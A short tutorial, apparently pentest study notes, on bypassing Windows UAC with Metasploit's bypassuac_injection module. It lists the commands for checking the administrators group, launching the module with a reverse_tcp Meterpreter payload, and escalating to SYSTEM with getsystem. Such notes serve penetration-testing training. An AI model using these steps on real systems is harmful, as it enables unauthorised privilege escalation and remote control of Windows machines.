# Bypassing UAC via Metasploit

- UAC (User account control) is a Windows security feature that requires administrative approval to make changes in the operating system.
- It is the yes/no box that appears saying "Do you want this app to make changes to your device?" when we try to execute an app.

#### PRIVILEGE ESCALTION:

1. Gain a x64 Meterpreter shell
2. Check whether the current user is in the "Administrators" group

```
net users
net localgroup administrators
```

3. Now background the current Meterpreter shell
4. and load the following module and run it

```
use exploit/windows/local/bypassuac_injection
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

5. This exploit will bypass the UAC and opens a second Meterpreter shell session with UAC flag turned off.
6. This allows us to run `getsystem` command and escalate our current privileges to NT AUTHORITY / SYSTEM

